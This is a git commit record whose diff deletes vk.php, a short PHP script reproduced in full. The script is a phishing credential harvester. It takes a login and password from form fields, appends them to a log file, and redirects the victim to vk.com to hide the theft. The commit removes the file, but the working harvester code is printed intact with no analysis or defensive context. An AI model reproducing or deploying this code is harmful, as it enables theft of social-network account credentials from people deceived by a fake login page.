876a5b4d53e43bc27bb38b3cb7d0a82a4bd3722e
Misha2005g <31647109+Misha2005g@users.noreply.github.com>
2019-05-28 20:14:10 +0300

    Delete vk.php

--- vk.php
+++
@@ -1,7 +0,0 @@
-$Login = $_POST['ser']; 
-$Pass = $_POST['res']; 
-$log = fopen("file2332453345.php","a+"); 
-fwrite($log,"<br> $Login:$Pass \n"); 
-fclose($log); //закрываем
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=vk.com'></head></html>"; 
-?> 
